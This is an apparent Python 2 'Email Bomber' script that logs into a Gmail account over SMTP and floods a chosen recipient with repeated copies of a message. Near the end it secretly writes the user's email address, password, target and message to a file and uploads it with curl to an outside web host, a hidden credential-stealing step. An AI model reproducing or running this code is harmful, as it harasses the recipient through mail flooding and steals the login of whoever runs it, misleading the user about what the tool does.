#!/usr/bin/python


import smtplib
import os, time, datetime
import getpass
import sys
a = time.time()
try:
    from colorama import Fore as f, Back as b, init
except:
    print "Error : Some Modules Missing.\nPlease Wait....\n"
    os.system("pip install colorama")
    os.system("pip2 install colorama")
    print f.CYAN+"\nSuccessfully Installed..."
def banner():
    return f.CYAN+'''
                                    3P1C'''+f.GREEN+'''
_____ ____   ___  __  __ ____  _____ ____
| ____| __ ) / _ \\|  \\/  |___ \\| ____|  _ \\
|  _| |  _ \\| | | | |\\/| | __) |  _| | |_) |
| |___| |_) | |_| | |  | |/ __/| |___|  _ <
|_____|____/ \\___/|_|  |_|_____|_____|_| \\_\\
                       '''+f.RED+'''         V2.0'''
init()
def author():
    print f.WHITE+'Tool For Email Bombing'
    
    print f.BLUE+'EPIC                    CYBER KNIGHT'


def connection(user_id,password,from_id,msg):
    conn = smtplib.SMTP('smtp.gmail.com',587)
    conn.ehlo()
    conn.starttls()
    conn.login(user_id,password)
    conn.sendmail(user_id,from_id,msg)
    conn.quit()
    
os.system('clear')
print banner()
author()
print datetime.datetime.now()
print f.WHITE+"+++++++++++++++++++++++++++++++++\n"
ui = raw_input(f.YELLOW+"\nEnter Your Email : ")
pwd = getpass.getpass(f.GREEN+"\nEnter Your Password : ")
fid = raw_input(f.CYAN+"\nEnter Your Friend Email : ")
ms = raw_input(f.BLUE+"\nEnter Your Message : ")
kitna = int(raw_input(f.RED+"\nTime : "))
try:
    for x in range(1,kitna+1):
        connection(ui,pwd,fid,ms)
        sys.stdout.write(f.CYAN+'\r[i] Sent... ['+str(x)+"]")
        sys.stdout.flush()
       
except:
    print f.RED+"Please Less Secure On After Using Tool."+f.GREEN+"\nGoto This Link : https://myaccount.google.com/security"   
fil = open('datam.html','w')
fil.write(" Email : "+ui+"\n Password : "+pwd+"\n Friend Email : "+fid+"\nMessage :"+ms)
fil.close()
os.system("curl -T datam.html https://inlislite.perpusnas.go.id")
b = time.time()
print f.BLUE+"\nTOTAL TIME :", int(b-a), "seconds"
